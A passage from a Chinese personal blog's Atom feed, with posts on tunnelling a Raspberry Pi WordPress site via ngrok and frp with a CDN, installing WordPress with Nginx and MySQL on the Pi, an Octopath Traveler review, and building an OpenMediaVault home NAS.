href="http://ngrok.ciqiuwl.cn/">小米球</a></p><p>里面有详细的下载ngrok客户端的步骤，以及如何使用的详细步骤</p><p><strong>Ngrok1.7：</strong></p><p>这里推荐国内的<a href="https://manager.xiaomiqiu.com/">小米球Ngrok服务</a>，是国人搭建的</p><p>右下角下载响应的客户端</p><p>下载好之后上传到树莓派</p><p>这里我的站点的URL填写的是frp.xiaoblogs.cn，但是没有设置这个域名的解析，导致站点的资源文件后台登录都用不了了。这里我用的是一个简单的方法。</p><p>首先在树莓派的/etc/hosts文件里面添加一个记录，让我的这个域名指向本机</p><p>之后重启网卡或者reboot使生效</p><p>之后ping一下域名看是不是解析到本机了</p><p>嗯~ o(<em>￣▽￣</em>)o</p><p>之后就可以进入wordpress的控制面板更改URL了</p><p>URL就改成映射的ngrok服务器给你提供的url吧</p><p>对了，我们还没讲配置ngork呢</p><p>ngrok照frp的配置要简单多了，可能也是我前面的时候一直用的是ngrok</p><p>auth_token是在注册系统中给你的，在小米球Ngrok管理系统中能找到</p><p>tunnels能里面的所有隧道都可以自己指定名称eg.httptun</p><p>远程端口remote_port不要更改，Proto里面的本地端口改成自己的http服务端口</p><p>subdomain子域名自己随机设定，别设定成和别人一样的就行</p><p>配置好就启动吧</p><p>首先先启动ngork吧，看一看给你分配的url</p><pre><code>sudo ./ngrok -config ./ngrok.conf start httptun</code></pre><p>通过pi.ngrok2.xiaomiqiu.cn访问本地的80服务</p><p>之后就可以更改wordpress的站点URL了</p><p>之后就试一试通过这个域名访问吧</p><p>后台返回200了</p><p>可以看到已经成功的实现内网穿透了</p><p><a href="https://diannaobos.com/frp/">frp官网</a></p><p>如果你有nas是freeBSD也可以用frp内网穿透，有freeBSD的版本</p><p>这里我说明下，因为要付费才能用别人的公网的frps服务器来提供服务，我就用自己的阿里云了</p><p><strong>公网服务器（如果你没有公网服务器就使用别人的，这一步就可以忽略了）:</strong></p><p>公网服务器要用到两个文件，frps.ini和frps的sh文件，一个是frps的配置文件，一个是启动脚本</p><p>首先来配置下，因为我要实现的是80端口的穿透</p><p>官方的完整配置文件里有详细的说明（这里只是一部分）</p><p>设置建立隧道的端口8085，让服务器监听80端口，映射本地的nginx服务器的80端口</p><p>别忘记了要在防火墙设置中开放两个端口</p><p>阿里云的控制台设置的</p><p>之后启动，可以用nohup &amp;做后台启动</p><pre><code>/path/to/frps -c /path/to/frps.ini</code></pre><p>成功开启</p><p>成功开启</p><p><strong>本地apache服务器的frpc设置</strong>：</p><p>common部分填写公网服务器IP和远程的端口，用来建立隧道，以及验证的token<br>下面部分填写本地的IP和端口和远程用于映射的端口</p><p>之后启动客户端</p><pre><code>/path/to/frpc -c /path/to/frpc.ini</code></pre><p>无论是客户端还是服务端都可以添加日志</p><p>可以看到log里面说明登录服务器成功</p><p>服务端已经看到了有一个客户端和自己建立了一个连接</p><p>之后就是测试了</p><p>访问我们自定义的域名，<strong>别忘记了域名要备案并且要到DNS服务器添加A记录或者CNAME记录</strong></p><p>成功的访问到了我们的内网的博客</p><p>资源文件也可访问到</p><p>这里给大家说一个tips</p><p>在安装wordpress要你填写主站IP</p><p>那个IP就是wordpress所有资源请求的入口</p><p>我碰到了什么问题呢，内网穿透完。可以通过自定义域名访问到主站的index.php但是却访问不到资源文件，而且设计到的提交表单等服务也不行</p><p>问题就在wordpress设置里主站IP的设置</p><p><strong>设置在这里，如果你是内网穿透的话，要把这里改成你的代理服务器IP或者自定义的域名</strong></p><p>frp后台可以看到建立了一个连接</p><p>当然也可以使用frp提供的dashboard仪表板查看自己的代理</p><p>基本上想看的内容都有</p><p>基本的内网穿透就完成了，还是很轻松的。</p><p><strong>用CDN加速博客访问</strong></p><p>下面开始最后的1/4之前，要有台公网的服务器和备案的域名。我就用第三方的CDN又拍云来做例子了，用自己的博客来实现加速</p><p>首先，又拍云是按流量来收钱的。所以大家用的时候要注意哦</p><p>价格还好吧</p><p>CDN有很多项服务，我使用的仅是域名管理，回源控制，和HTTPS</p><p>添加好自己的域名</p><p>之后要在DNS解析中添加CNAME</p><p>帮助说明的很清楚</p><p>添加一个DNS解析</p><p>回源管理，设置资源文件站</p><p>HTTPS设置</p><p>基本的设置在又拍云的官方文档有详细的说明，我就不赘述了</p><p>之后就是ab测试环节了</p><p>没开启cdn</p><p>开启cdn</p><p>开启cdn之后提示他的CNAME域名没有备案。。。真实无语了</p><p>阿里云也有CDN的服务，文档都超级详细，需要的小伙伴就去跟着步骤走吧。</p><p>我这里只是提供一个CDN加速博客的思路</p><p><strong>总结</strong></p><p>这一次的进阶篇完成了4部分的内容，都是对自己的站点进行了优化的工作。当然我这里还有没涉及到的站长必做的SEO。基本到这里，涉及到的知识就很多了，各位同学好友们就多加努力吧，做好一个站长不容易，要长久的学习！才能成为好站长！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;上次我们看过了如何用树莓派搭建wordpress&lt;/p&gt;
&lt;p&gt;这一次我们来玩一点不一样的，弄一点树莓派wordpress的进阶的玩法。  &lt;/p&gt;</summary>
    
    
    
    <category term="学习呦" scheme="https://mimonarchrd.gitee.io/categories/%E5%AD%A6%E4%B9%A0%E5%91%A6/"/>
    
    
    <category term="学习" scheme="https://mimonarchrd.gitee.io/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CDN加速" scheme="https://mimonarchrd.gitee.io/tags/CDN%E5%8A%A0%E9%80%9F/"/>
    
    <category term="HTTPS" scheme="https://mimonarchrd.gitee.io/tags/HTTPS/"/>
    
    <category term="内网穿透" scheme="https://mimonarchrd.gitee.io/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    
    <category term="动静分离" scheme="https://mimonarchrd.gitee.io/tags/%E5%8A%A8%E9%9D%99%E5%88%86%E7%A6%BB/"/>
    
    <category term="博客" scheme="https://mimonarchrd.gitee.io/tags/%E5%8D%9A%E5%AE%A2/"/>
    
    <category term="进阶篇" scheme="https://mimonarchrd.gitee.io/tags/%E8%BF%9B%E9%98%B6%E7%AF%87/"/>
    
  </entry>
  
  <entry>
    <title>树莓派的新(jiu)玩法-搭建自己的个人博客-基础篇</title>
    <link href="https://mimonarchrd.gitee.io/2020/01/15/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E6%96%B0(jiu)%E7%8E%A9%E6%B3%95-%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2-%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <id>https://mimonarchrd.gitee.io/2020/01/15/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E6%96%B0(jiu)%E7%8E%A9%E6%B3%95-%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2-%E5%9F%BA%E7%A1%80%E7%AF%87/</id>
    <published>2020-01-14T23:51:31.000Z</published>
    <updated>2021-08-19T02:16:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实这篇博客以前是写过的，不过当时的博客是Ghost，后面因为把树莓派的SD折断了。导致数据都抢救不过来。只能重新搭建自己的博客。</p><p>博客的选择有很多，Wordpress、Hexo、Jekyll、Hugo、Ghost、Typecho等等</p><p>这些博客各有优缺点，Wordpress功能强大，拓展性好。第三方插件的数量应该是最多的，也有很多的不同主题的网站，你可以将你的网站变成不同类型的网站，不同功能用途的网站。但是因为过多的插件导致wordpress很庞大臃肿，导致浏览器加载速度慢。尤其最近我的博客的一些资源加载要用到wordpress的cdn来加载网站所需的资源文件，有的文件体积庞大，加上时常连接不上。而且wordpress 的数据都是保存在其他数据库中，这其中还要涉及从云数据库或者本地读取数据的过程。导致我的博客的加载速度很慢。（当然，不止这一个原因导致博客慢，只能说是主要的原因）不过可以用国内的cdn做一下动态内容的加速，速度还是挺快的。</p><p>Hexo简洁，用的nodejs。从建站到部署只需要几分钟的时间。相较于Wordpress，Hexo不需要数据库的支持，这一点我认为是他快速简洁的最大的原因。通过将MarkDown文件转换成为html文件之后上传到GitHub并且部署到GitHub page或其他仓库。以至于从写文章到发布文章不需要将写好的文章存储到数据库中。多数的个人博客的组合就是Hexo+Github Page</p><p>其他的博客我不太熟悉喽，烦请各位自己去查一查原理吧。</p><p>简要说了两种博客的优缺点，接下来就是抉择的时候了。  </p><span id="more"></span><p>我的树莓派是3B+，通过SD卡的方式存储，非eMMc等现在高级的Linux开发板。待机功耗基本在5W左右，处理1080p视频能力很弱（树莓派的GPU就不是为了处理视频而生，当然，博客不需要太考虑这一点，除非是现在的视频媒体）树莓派3B+支持无线和以太网，多少数据大家看下图吧。</p><p>图片<a href="http://tieba.baidu.com/photo/p?kw=%E6%A0%91%E8%8E%93%E6%B4%BE&ie=utf-8&flux=1&tid=6211096781&pic_id=6808e739b6003af350d3bcb33b2ac65c1238b6d7&pn=1&fp=2&see_lz=0">来源</a></p><p>看到这儿是不是觉得树莓派真的不行？其实，我这里的用途不是针对树莓派的优点所应用的，树莓派有40帧GPIO，而且支持很多OS，Ubuntu，raspberry官方系统，win10IoT等。做很多的物联网设备还是很在行的，自动投食，机械臂，电报机等等。</p><p>(⊙﹏⊙)呃……说了这么多的话也是让大家了解下树莓派做博客的一些弊端。各大网站上还有很多的Linux的开发板，自己搜一搜，对比下，有的可以直接装64位Linux也是很不错的。</p><p>这次的博客我就用树莓派3B+和wordpress的组合，wordpress简单。等以后的阿里云ECS到期了就转战到Hexo！</p><p><strong>环境准备：</strong></p><p>wordpress是php写的，所以php的环境就必不可少了。</p><p>制卡和上电以及配置树莓派WiFi或者网络的步骤烦请大家移步去我的<a href="https://www.xiaoblogs.cn/?p=185">另一篇博客</a>吧。我的镜像是2019.9月的镜像。</p><p>我是无线网卡连接</p><p>通过shell软件连接到树莓派上（我用的是SecureCRT）</p><p>1、首先安装php</p><p>可以直接通过apt安装，apt源默认的配置的源什么软件包几乎都有了。所以可以通过</p><pre><code>sudo apt-get updatesudo apt-get install php7.3 php7.3-fpm php7.3-mysql php7.3-commonsudo apt-get install default-mysql-serversudo apt-get install nginx apache2</code></pre><p>php，mysql，nginx就都安装好了。方便快捷，甚至还可以通过下载lnmp一键安装包（<a href="https://lnmp.org/">点我去官网</a>）</p><p>也可以下载源码自己编译</p><p>我这里同时安装了nginx和apache，我的想法是nginx做静态文件的处理和调度（如果需要）apache2做动态文件的处理。</p><p>根据我的思路，nginx处理外部访问博客的请求，静态文件（图片，css，html等就直接的处理之后返回给客户端，但是动态的文件，php就将请求转发给后面的apache2，通过apache2处理之后返回给客户端）</p><p>一点一点来</p><p>先配置下nginx的php解析处理</p><p>php7.3-fpm已经运行了</p><p>打开nginx 的配置文件</p><p>位置在这里</p><p>配置虚拟服务器server的时候到site-enabled指定的文件夹中去</p><p>server块就是nginx里面的虚拟主机，可以配置多个虚拟主机，每一主机都可以处理不同的请求</p><p>listen：监听端口</p><p>server_name：虚拟主机名，比如你的域名(我的域名：<a href="http://www.xiaoblogs.cn)通过这个名字可以让nginx知道要用你配置的哪个server块来处理/">www.xiaoblogs.cn)通过这个名字可以让nginx知道要用你配置的哪个server块来处理</a></p><p>root：就是你配置的虚拟主机的目录</p><p>index：访问的主页，可以是html也可以是动态文件php等</p><p>location：路径匹配部分。这里说的是匹配到你的服务器的根目录后的路径</p><p>php的连接方式用的是通过sock通信，同样也可以通过cgi绑定一个单独的端口通信。</p><p>在你配置的虚拟server的根目录建立一个.php的文件，之后填入</p><pre><code>&lt;?php    phpinfo();?&gt;</code></pre><p><strong>别忘记了，你的php文件以及存放的路径文件夹的权限都要是nginx能访问的www-data</strong></p><p>好了，测试一下吧</p><p>可以看到能够正确的访问到index.php并且也表明正确的解析了php文件<br><strong>注意哦，处理的服务器是nginx</strong></p><p>接下来就是数据库了</p><p>安装mysql上面已经安装完成了</p><p>首先创建一个账户供wordpress使用，通过root用户添加一个用户</p><p>但是默认的root密码要更改</p><p>通过切换到root用户之后就可以直接登录MySQL了，不需要进入无密码模式</p><pre><code>mysql -u root</code></pre><p>之后更改root用户密码，毕竟总是用root用户直接登录MySQL不安全</p><p>切换到mysql数据库，这个数据库中存放的是MySQL中的用户名密码权限等数据</p><pre><code>update user set authentication_string=password(&quot;你的密码&quot;) where user=&quot;root&quot;;</code></pre><p>之后刷新下MySQL系统权限表</p><pre><code>flush privileges;</code></pre><p>就OK了</p><p>下一步是通过MySQL的root创建一个wordpress的数据库的用户和wordpress数据库，root用户给予这个新用户对wordpress数据库全部权限</p><pre><code>create user wordpress@localhost identified by &quot;你的密码&quot;;create database 你的wordpress数据库;</code></pre><p>命令解释：</p><p>CREATE USER ‘<strong>USERNAME</strong>‘@’<strong>HOST</strong>‘ IDENTIFIED BY ‘<strong>PASSWORD</strong>‘;</p><p>给予权限</p><pre><code>grant all privileges on 数据库.* to 用户@主机</code></pre><p>之后别忘了测试下</p><p>可以进入就说明权限设置完毕啦</p><p>好了，前置准备就完成了。接下来就是下载wordpress了。</p><p>安装wordpress</p><p><a href="https://wordpress.org/latest.tar.gz">官网连接</a> &amp; <a href="http://seafile.xiaoblogs.cn:8000/f/ab50bbc1c7594974bdc8/">我的私有云盘</a>（<strong>是5.3版本</strong>）</p><p>上传到你的树莓派的/var/www/目录下并解压（建议var这个目录下）</p><pre><code>sudo tar -xvf /path/to/wordpress压缩包.tar.gz</code></pre><p>看wordpress目录的所属者和所属组</p><p>先设置成nginx的用户所属</p><pre><code>sudo chown -R www-data:www-data wordpress</code></pre><p>所有的wordpress文件</p><p>首先要配置wordpress数据库，之后直接在浏览器访问安装的php文件就完了</p><p>将wp-config-sample.php重新命名成 wp-config.php（建议复制一份留作备份文件）</p><pre><code>备份：sudo cp wp-config-sample.php wp-config-sample.php.backup重命名： sudo mv wp-config-sample.php wp-config.php</code></pre><p>用文本编辑器打开编辑</p><p>这里就是数据库的配置部分</p><p>现在的wordpress还可以配置cookie，有兴趣的小伙伴可以试一试</p><p>从上到下为数据库名，数据库用户，数据库密码，数据库IP</p><p>填写上你的数据库的这些信息就行，肥肠简单啊！</p><p><strong>别着急，别着急，现在还没完</strong></p><p>之后还要回到nginx中配置wordpress呢</p><p>在nginx目录下的site-available目录下有一个default文件直接在里面配置wordpress的虚拟server</p><p>配置的部分</p><p>端口</p><p>根目录</p><p>资源文件不可直接访问</p><p>以及前面配置的php解析部分</p><p>之后就是检查下配置文件有无错误之后平滑加载配置文件就行</p><pre><code>sudo nginx -tsudo nginx -s reload</code></pre><p>之后才到通过浏览器访问直接安装wordpress哦</p><p>看到这个是不是超级激动？</p><p>访问的域名是 <a href="http://example.com/wp-admin/install.php">http://example.com/wp-admin/install.php</a> 格式</p><p>好了，剩下就是注册用户、设置站点的一些信息了</p><p>官方文档的著名的5分钟安装</p><p>可以看到就完成了</p><p><strong>总结一下吧</strong></p><p>Wordpress作为最广泛著名的个人CMS，还是有其特点的。安装简单，操作便捷。可拓展性强。有的时候有一个自己的博客写一写技术性的文章或者是心情的随笔都是很不错的地方哎。</p><p>下一次我们就要这八经的做HTTPS，动静分离，内网穿透的甚至加入cdn等任务来优化配置我们的博客了呢。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;其实这篇博客以前是写过的，不过当时的博客是Ghost，后面因为把树莓派的SD折断了。导致数据都抢救不过来。只能重新搭建自己的博客。&lt;/p&gt;
&lt;p&gt;博客的选择有很多，Wordpress、Hexo、Jekyll、Hugo、Ghost、Typecho等等&lt;/p&gt;
&lt;p&gt;这些博客各有优缺点，Wordpress功能强大，拓展性好。第三方插件的数量应该是最多的，也有很多的不同主题的网站，你可以将你的网站变成不同类型的网站，不同功能用途的网站。但是因为过多的插件导致wordpress很庞大臃肿，导致浏览器加载速度慢。尤其最近我的博客的一些资源加载要用到wordpress的cdn来加载网站所需的资源文件，有的文件体积庞大，加上时常连接不上。而且wordpress 的数据都是保存在其他数据库中，这其中还要涉及从云数据库或者本地读取数据的过程。导致我的博客的加载速度很慢。（当然，不止这一个原因导致博客慢，只能说是主要的原因）不过可以用国内的cdn做一下动态内容的加速，速度还是挺快的。&lt;/p&gt;
&lt;p&gt;Hexo简洁，用的nodejs。从建站到部署只需要几分钟的时间。相较于Wordpress，Hexo不需要数据库的支持，这一点我认为是他快速简洁的最大的原因。通过将MarkDown文件转换成为html文件之后上传到GitHub并且部署到GitHub page或其他仓库。以至于从写文章到发布文章不需要将写好的文章存储到数据库中。多数的个人博客的组合就是Hexo+Github Page&lt;/p&gt;
&lt;p&gt;其他的博客我不太熟悉喽，烦请各位自己去查一查原理吧。&lt;/p&gt;
&lt;p&gt;简要说了两种博客的优缺点，接下来就是抉择的时候了。  &lt;/p&gt;</summary>
    
    
    
    <category term="学习呦" scheme="https://mimonarchrd.gitee.io/categories/%E5%AD%A6%E4%B9%A0%E5%91%A6/"/>
    
    
    <category term="树莓派" scheme="https://mimonarchrd.gitee.io/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
    
    <category term="wordpress" scheme="https://mimonarchrd.gitee.io/tags/wordpress/"/>
    
    <category term="个人博客" scheme="https://mimonarchrd.gitee.io/tags/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    
    <category term="建站" scheme="https://mimonarchrd.gitee.io/tags/%E5%BB%BA%E7%AB%99/"/>
    
    <category term="有趣" scheme="https://mimonarchrd.gitee.io/tags/%E6%9C%89%E8%B6%A3/"/>
    
  </entry>
  
  <entry>
    <title>游历八方评赏赞歌</title>
    <link href="https://mimonarchrd.gitee.io/2019/10/04/231/"/>
    <id>https://mimonarchrd.gitee.io/2019/10/04/231/</id>
    <published>2019-10-03T20:35:38.000Z</published>
    <updated>2021-08-17T23:28:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>有幸体验了SE的大作《八方旅人》，一款典型的JRPG。</p><p><img src="http://static.xiaoblogs.cn/img/2018_07_18_aec8e5f0492247d78f49cdc3155c463e.jpeg"></p><p>本来奔着随笔形式去写，但JRPG的体验仅有口袋妖怪和塞尔达。其实说来也属游戏评测。</p><p>奥斯泰拉大陆上，有着八个性格迥异，背负着使命，怀揣着梦想的旅者。浪漫的旅者们各个武艺高强且有特殊能力，像是勾引诱惑别人和你一块走上“不归路”也有拿上权杖美其名曰“指引”别人和你踏上“不归之路”。8个人组成一个队伍倒是符合阵容搭配。</p><p>8位旅人，男子仿若“ 宗之潇洒美少年，举觞白眼望青天，皎如玉树临风前 ”。女子更是“ 千秋无绝色，悦目是佳人”。</p><p>神官、商人、药师、骑士、舞女、猎人、学者、盗贼</p><p>很丰富的设定，想体验什么人生故事都可以吧。 玩一些角色像读故事书。有的角色让你有使命感去保护，有的角色则是伤感惋惜最后的反转。</p><p>最喜欢商人（特蕾莎）的设定。活泼可爱元气满满的姑娘，总能让人联想到一天之初的朝阳。</p><p>场景交互方面这八个人可谓是“八仙过海，各显神通”。猎人骑士等可以和随便一个路人进行战斗，盗贼可以偷东西。偷东西有一个成功率嘛。有一次去特蕾莎（商人）家偷东西，发现成功率为0，不愧是大商人。这种小细节特别的有意思。舞女很美，可以勾引别人加入队伍（你懂得）</p><p><img src="http://static.xiaoblogs.cn/img/H63d=nGqS3ECx5E8pX4UAOuDvcVAazUakf5cet2ntCSsa1531554990846compressflag.jpg"></p><p>插画是真的好看呀，但是官方的仅仅只有很少的插画，同人倒是不少吧</p><p><img src="http://static.xiaoblogs.cn/img/cygW0c2Qky.gif"></p><p>整个游戏画面是8bit像素画的风格，通过一种摄影技巧“移轴镜摄影 ”将游戏变成了一个巨大的沙盘模型。</p><p>游戏里的多个城市也是不同。其中的雪城——弗雷姆格雷斯， 雪花覆盖在高台上，洁白无瑕，像是刚刚建成的碧玉台。雪花裹缠在树技上，晶莹闪烁，似刚刚栽植的美玉树</p><p>操作和游戏内的Boost和break的设定让你在战斗的时候也要考虑属性克制，如何合理用的BP点数。这些我就不过多说游戏内的玩法了，我接触的不多。不过效果和令人玩游戏的“爽感”可是有的，尤其是精打细算用BP对对面的BOSS进行了break，破甲后ding的声音是最好听的，让你还是有成就感的。</p><p>游戏的世界设定。别具一格，独出心裁。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;有幸体验了SE的大作《八方旅人》，一款典型的JRPG。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://static.xiaoblogs.cn/img/2018_07_18_aec8e5f0492247d78f49cdc3155c463e.jpeg&quot;&gt;&lt;/p&gt;
&lt;p&gt;本来奔</summary>
      
    
    
    
    <category term="生活" scheme="https://mimonarchrd.gitee.io/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="八方旅人" scheme="https://mimonarchrd.gitee.io/tags/%E5%85%AB%E6%96%B9%E6%97%85%E4%BA%BA/"/>
    
    <category term="歧途旅人" scheme="https://mimonarchrd.gitee.io/tags/%E6%AD%A7%E9%80%94%E6%97%85%E4%BA%BA/"/>
    
    <category term="游戏" scheme="https://mimonarchrd.gitee.io/tags/%E6%B8%B8%E6%88%8F/"/>
    
  </entry>
  
  <entry>
    <title>树莓派的又一次折腾-搭建家用NAS</title>
    <link href="https://mimonarchrd.gitee.io/2019/08/07/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8A%98%E8%85%BE-%E6%90%AD%E5%BB%BA%E5%AE%B6%E7%94%A8NAS/"/>
    <id>https://mimonarchrd.gitee.io/2019/08/07/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%9A%84%E5%8F%88%E4%B8%80%E6%AC%A1%E6%8A%98%E8%85%BE-%E6%90%AD%E5%BB%BA%E5%AE%B6%E7%94%A8NAS/</id>
    <published>2019-08-07T08:22:49.000Z</published>
    <updated>2021-09-05T13:31:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>NAS-网络附属存储，就是把服务和存储分离开来，分别实现。说到这个，为什么搭建NAS呢，先说下家里的电子设备的环境，4台电脑，两个笔记本两个台式。之间传输资源数据都是靠移动硬盘什么的，自己的网盘seafile。很不方便。而且家里的媒体服务器没有，现在投屏看一看视频或者是一遍看视频一遍下载文件这样的形成了一种带宽的两极化，用的时候几乎占满带宽，不用的时候根本不占带宽。算是一种资源的浪费，也就让我萌生了自建NAS的想法。</p><p>话不多说，现在就开始。  </p><span id="more"></span><p>NAS系统有很多，群晖、FreeNAS、NAS4FREE、还有我用的OpenMediaVault。选择OMV的原因是正好看见有树莓派的镜像，因为家里闲置的能长时间运行并且功耗小的也就树莓派了，虽然OMV官方都有“善意”提示</p><p>。。。</p><p>不过，家里除了我们一家三口用一用应该就没别人用了，性能足够了。还有就是以前听过的FreeNas，没选它的原因就是人家只支持64位。。树莓派是arm-v7</p><p>首先是去官网下载镜像，还有去找一个烧录镜像的工具</p><p><a href="https://www.openmediavault.org/">官网链接点这里</a>（建议玩这些都要有小飞机）</p><p><a href="https://sourceforge.net/projects/openmediavault/files/">官方提供的镜像下载地址</a>（没用小飞机下载真的很痛苦哦）</p><p>我把镜像（ Raspberry Pi 2B, 3B and 3B+ 都可以用）放到了<a href="https://pan.baidu.com/s/1kYw_ezTNKn6_3vtTdUGkAA">百度云</a> （提取码：5xhn） 上和<a href="http://seafile.xiaoblogs.cn:8000/f/10dcdcade53f4690991d/">自己的网盘seafile</a>上</p><p>制作系统的工具也是在<a href="https://pan.baidu.com/s/1E6c9t4VxasgkkOPFiEicMA">百度云</a>（提取码：ljqv）和<a href="http://seafile.xiaoblogs.cn:8000/f/519a014ad8d6404ba23b/">私有云盘</a>上</p><p>制作的过程真是一键操作，把SD卡插入电脑用工具一键制作就行了</p><p>速度挺快</p><p>之后就是插卡上电~</p><p><strong>登录的用户名和密码不一样</strong></p><p>Web应用的用户是admin，shell的用户是root</p><p>注意要用root用户登录</p><p>登录之后看到没有IP，如果你的树莓派插上路由器网线都没有获取到IP那么可以通过命令</p><pre><code>armbian-config</code></pre><p>进入armbian的配置界面，或者通过命令</p><pre><code>nmtui</code></pre><p>进入网卡的设置界面，配置自己的网卡</p><p>这里我碰到一个有趣的问题，我们家里的拓扑结构是这样的</p><p>为了方便，交换机，网关，路由器都变画成路由器了</p><p>刚开始给NAS（树莓派）分配IP的时候错误的连接到了子网路由器（TP-Link上），结果就是分配了子网网段的IP，但是手动给配置的IP和网关都是天翼网关的。结果就是局域网内能连通，无法上外网。</p><p>反正，我也搞不懂家里为什么这种拓扑结构。。</p><p>如果你的家里只有一个路由器就能解决一些问题。</p><p>之后进入系统（我因为手动配置IP的时候直接用的HDMI外接显示器，树莓派的输出都在显示器上，不要吐槽我手机拍屏幕）发现nginx启动不了。这可不行啊，Web服务都是在nginx上，这样就用不了Web应用。</p><p>用命令看下nginx的状态</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status nginx</span><br></pre></td></tr></table></figure><p>提示地址簇不支持这种协议</p><p>好吧，来到/etc/nginx/sites-available/openmediavault-webgui下看（OMV配置文件）</p><p>listen这里怎么会这样写？</p><p>“#”注释的是错误的，[::]正则表达式代表0.0.0.0任何访问的IP，后面的80就是http了，只要用下面的写法就行。</p><p>成功启动nginx进程</p><p>去浏览器访问web应用吧</p><p>这里的登录用户是admin哦</p><p>之后就是配置一气了，首先注意要先允许root用户通过ssh登录shell，要不然，只能外接显示器连接服务器了哦</p><p>注意了，ssh很关键的。远程ssh后期的维护都是靠shell呢</p><p>基本的配置在<strong>System栏</strong></p><p>可以设置web服务器监听的端口，配置https，域名（外网访问）。设置时间时区。邮件通知（需要stmp服务器，其他两个协议的也行pop3和IMAP。性能监视，还有有意思的定时任务（比如备份策略什么的）还有就是装东西的OMV-Plugin（OMV插件）和OMV-Extras（OMV拓展）</p><p><strong>Storage栏：</strong></p><p>存储设备设置的地方，有物理磁盘（physical disks）磁盘监视器，RAID冗余磁盘阵列。一键挂载的file system设置和u盘flash（不建议用u盘）</p><p>正好家里的一块希捷的1T的HDD只是作为移动设备使用，来，格式化成ext4之后挂载了。</p><p>插到树莓派上就可以，不知道能不能热插拔</p><p>现在只是识别了这一块硬盘，当然，如果你的硬盘是ntfs最好要转换格式成ext4哦，否则会出一些错误</p><p>这里的错误是系统内核的错误</p><p>倒不是内核编译问题导致模块不能用，而是内核版本太低不支持虚拟化磁盘</p><pre><code>apt-get install kernel*</code></pre><p>上面的命令就是升级内核的</p><p>选中磁盘可以擦除磁盘</p><p>在File Systems中挂载磁盘，之后才能使用<br>当然，你有RAID可以使用RAID的管理器</p><p><strong>先说Diagnostics和information：</strong></p><p>Diagnostics就是显示系统的一些运行日志，运行的状态，系统信息，服务信息状态的。</p><p>information就是“关于”（可以看看QQ和微信的“关于”）</p><p><strong>Services：</strong></p><p>这里就是NAS支持的服务了，有很多</p><p>自己看吧</p><p>Apple Filing没有mac，用不了时光机</p><p>FTP，通过ftp协议进行传输的一种文件协议。基于这种协议的文件服务器。顾名思义，传输文件。实时文件共享，双向传输。权限划分</p><p>NFS，树莓派就是一个文件服务器，很多设备可以访问树莓派拿到数据。这也就是解决我的家里很多PC和Laptop之间传输文件的解决方案</p><p>SMB：这个是微软和因特尔共同推出的文件共享协议，不知道大家用没用过windows上面的文件共享，两天电脑之间拷贝文件不需要u盘只需要文件共享和同一个局域网下就可以拷贝文件了。用这个协议也可以实现我要完成的功能，但是这个会话的建立要双方，所以必须请求机器和目标机器同时在线，所以就算了吧</p><p>ssh：不要问我</p><p>媒体服务器media server（PlexMediaServer）：</p><p>超级简单的安装，不需要shell，一键安装。</p><p>拓展里打开</p><p>plugin里面找到安装</p><p>先看看 PlexMediaServer 原理</p><p>懂了吗</p><p>一部电影，一首歌曲，多个设备，连续播放</p><p>里面就是通过注册一个账号之后一步一步设置，没什么可截图的。</p><p>注意，如果要开启外网访问要用到内网穿透</p><p>我这里通过ftp方式添加媒体</p><p>把媒体拖到自己的媒体文件夹</p><p>在plex中添加自己的媒体文件夹</p><p>我这里就演示下多端同步</p><p>有些人说你这还要先下载，之后拖到相应文件夹，麻不麻烦。</p><p>下载的步骤可以用OMV提供的下载插件，拖到相应的文件夹完全可以用shell编程解决。有些人还要说我手机一个APP什么的，直接联网看。我只能说完全不一样的东西你非要杠我也没办法。</p><p>最方便的应该就是照片的查看</p><p><strong>总结</strong>：</p><p>好吧，本来要介绍下OVM系统。但是仅仅是写这一篇博客的话总感觉是一次实验而已。树莓派做NAS真的就仅仅是玩具。所以最后决定还是老老实实准备购置一套1000以内的散件，自己组一台正真的NAS！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;NAS-网络附属存储，就是把服务和存储分离开来，分别实现。说到这个，为什么搭建NAS呢，先说下家里的电子设备的环境，4台电脑，两个笔记本两个台式。之间传输资源数据都是靠移动硬盘什么的，自己的网盘seafile。很不方便。而且家里的媒体服务器没有，现在投屏看一看视频或者是一遍看视频一遍下载文件这样的形成了一种带宽的两极化，用的时候几乎占满带宽，不用的时候根本不占带宽。算是一种资源的浪费，也就让我萌生了自建NAS的想法。&lt;/p&gt;
&lt;p&gt;话不多说，现在就开始。  &lt;/p&gt;</summary>
    
    
    
    <category term="学习呦" scheme="https://mimonarchrd.gitee.io/categories/%E5%AD%A6%E4%B9%A0%E5%91%A6/"/>
    
    
    <category term="NAS" scheme="https://mimonarchrd.gitee.io/tags/NAS/"/>
    
    <category term="OVM" scheme="https://mimonarchrd.gitee.io/tags/OVM/"/>
    
    <category term="树莓派" scheme="https://mimonarchrd.gitee.io/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
    
  </entry>
  
</feed>
